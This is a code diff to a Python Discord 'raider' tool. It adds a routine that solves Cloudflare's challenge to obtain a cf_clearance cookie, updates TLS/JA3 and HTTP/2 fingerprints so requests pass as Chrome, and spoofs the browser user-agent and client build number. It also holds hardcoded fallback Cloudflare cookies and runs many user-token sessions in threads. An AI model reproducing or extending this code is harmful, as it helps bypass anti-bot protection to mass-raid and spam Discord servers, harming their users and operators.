@@ -19,6 +19,7 @@ import os
 import random
 import re
 import requests
+import secrets
 import string
 import threading
 import time
@@ -26,7 +27,7 @@ import tls_client
 import uuid
 import websocket
 
-session = tls_client.Session(client_identifier="chrome_138", random_tls_extension_order=True, ja3_string="771,4865-4866-4867-49195-49196-49200-52393-52392-49171-49172-156-157-47-53,65281-18-35-51-23-45-43-13-5-25-11-27,29-23-24,0", h2_settings={"HEADER_TABLE_SIZE":65536,"ENABLE_PUSH":0,"INITIAL_WINDOW_SIZE":6291456,"MAX_HEADER_LIST_SIZE":262144}, h2_settings_order=["HEADER_TABLE_SIZE","ENABLE_PUSH","INITIAL_WINDOW_SIZE","MAX_HEADER_LIST_SIZE"], supported_signature_algorithms=["ecdsa_secp256r1_sha256","rsa_pss_rsae_sha256","rsa_pkcs1_sha256","ecdsa_secp384r1_sha384","rsa_pss_rsae_sha384","rsa_pkcs1_sha384","rsa_pss_rsae_sha512","rsa_pkcs1_sha512"], supported_versions=["TLS_1_3","TLS_1_2"], key_share_curves=["GREASE","X25519MLKEM768","X25519","secp256r1","secp384r1"], pseudo_header_order=[":method",":authority",":scheme",":path"], connection_flow=15663105, priority_frames=[])
+session = tls_client.Session(client_identifier="chrome_138", random_tls_extension_order=True, ja3_string="771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,0-5-10-11-13-16-18-23-27-35-43-45-51-17613-65037-65281,4588-29-23-24,0", h2_settings={"HEADER_TABLE_SIZE": 65536, "ENABLE_PUSH": 0, "INITIAL_WINDOW_SIZE": 6291456, "MAX_HEADER_LIST_SIZE": 262144}, h2_settings_order=["HEADER_TABLE_SIZE", "ENABLE_PUSH", "INITIAL_WINDOW_SIZE", "MAX_HEADER_LIST_SIZE"], supported_signature_algorithms=["ecdsa_secp256r1_sha256", "rsa_pss_rsae_sha256", "rsa_pkcs1_sha256", "ecdsa_secp384r1_sha384", "rsa_pss_rsae_sha384", "rsa_pkcs1_sha384", "rsa_pss_rsae_sha512", "rsa_pkcs1_sha512"], supported_versions=["TLS_1_3", "TLS_1_2"], key_share_curves=["GREASE", "X25519MLKEM768", "X25519", "secp256r1", "secp384r1"], pseudo_header_order=[":method", ":authority", ":scheme", ":path"], connection_flow=15663105, priority_frames=[])
 
 def get_random_str(length):
     return "".join(random.choice(string.ascii_letters + string.digits) for _ in range(length))
@@ -191,6 +192,7 @@ class Render:
             response += token
         if log:
             response += f" ({C['gray']}{log}{C['white']})"
+
         with self.print_lock:
             print(response)
 
@@ -408,8 +410,31 @@ def scrape(token, guild_id, channel_id):
     
 class Raider:
     def __init__(self):
+        self.build_number = 429117
+        self.cf_token = self.get_cloudflare_cookies()
         self.cookies, self.fingerprint = self.get_discord_cookies()
         self.ws = websocket.WebSocket()
+
+    def get_cloudflare_cookies(self):
+        try:
+            response = requests.get(
+                "https://discord.com/channels/@me"
+            )
+
+            challange = re.sub(r".*r:'([^']+)'.*", r"\1", response.text, flags=re.DOTALL)
+            build_number = re.sub(r'.*"BUILD_NUMBER":"(\d+)".*', r'\1', response.text, flags=re.DOTALL)
+            if build_number is not None:
+                self.build_number = build_number
+
+            cf_token = requests.post(f'https://discord.com/cdn-cgi/challenge-platform/h/b/jsd/r/{random.random():.16f}:{str(int(time.time()))}:{secrets.token_urlsafe(32)}/{challange}')
+            match cf_token.status_code:
+                case 200:
+                    cookie = list(cf_token.cookies)[0]
+                    return f"{cookie.name}={cookie.value}"
+                case _:
+                    console.log("ERROR", C["red"], "Failed to get cf_clearance")
+        except Exception as e:
+            console.log("ERROR", C["red"], "get_cf", e)
 
     def get_discord_cookies(self):
         try:
@@ -420,7 +445,7 @@ class Raider:
                 case 200:
                     return "; ".join(
                         [f"{cookie.name}={cookie.value}" for cookie in response.cookies]
-                    ) + "; locale=en-US", response.json()["fingerprint"]
+                    ) + f"; {self.cf_token}; locale=en-US", response.json()["fingerprint"]
                 case _:
                     console.log("ERROR", C["red"], "Failed to get cookies using Static")
                     return "__dcfduid=62f9e16000a211ef8089eda5bffbf7f9; __sdcfduid=62f9e16100a211ef8089eda5bffbf7f98e904ba04346eacdf57ee4af97bdd94e4c16f7df1db5132bea9132dd26b21a2a; __cfruid=a2ccd7637937e6a41e6888bdb6e8225cd0a6f8e0-1714045775; _cfuvid=s_CLUzmUvmiXyXPSv91CzlxP00pxRJpqEhuUgJql85Y-1714045775095-0.0.1.1-604800000; locale=en-US"
@@ -431,15 +456,13 @@ class Raider:
         try:
             payload = {
                 "os": "Windows",
-                "browser": "Discord Client",
+                "browser": "Chrome",
                 "release_channel": "stable",
-                "client_version": "1.0.9200",
-                "os_version": "10.0.19045",
+                "os_version": "10",
                 "system_locale": "pl",
-                "browser_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9200 Chrome/134.0.6998.205 Electron/35.3.0 Safari/537.36",
-                "browser_version": "35.3.0",
-                "client_build_number": random.randint(423077, 426500),
-                "native_build_number": 66535,
+                "browser_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36 Edg/139.0.0.0",
+                "browser_version": "139.0.0.0",
+                "client_build_number": int(self.build_number),
                 "client_launch_id": str(uuid.uuid4()),
                 "client_heartbeat_session_id": str(uuid.uuid4()),
                 "launch_signature": str(uuid.uuid4()),
@@ -458,7 +481,7 @@ class Raider:
             "authorization": token,
             "cookie": self.cookies,
             "content-type": "application/json",
-            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9200 Chrome/134.0.6998.205 Electron/35.3.0 Safari/537.36",
+            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36 Edg/139.0.0.0",
             "x-discord-locale": "en-US",
             "x-debug-options": "bugReporterEnabled",
             "x-fingerprint": self.fingerprint,
@@ -1454,6 +1477,7 @@ class Menu:
                 }
             else:
                 session.proxies = {} 
+                
             thread = threading.Thread(target=func, args=arg, daemon=True)
             threads.append(thread)
             thread.start()
